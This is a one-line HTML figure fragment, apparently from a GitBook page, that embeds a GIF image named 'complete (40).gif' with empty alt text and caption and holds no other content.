<figure><img src="../../.gitbook/assets/complete (40).gif" alt=""><figcaption></figcaption></figure>
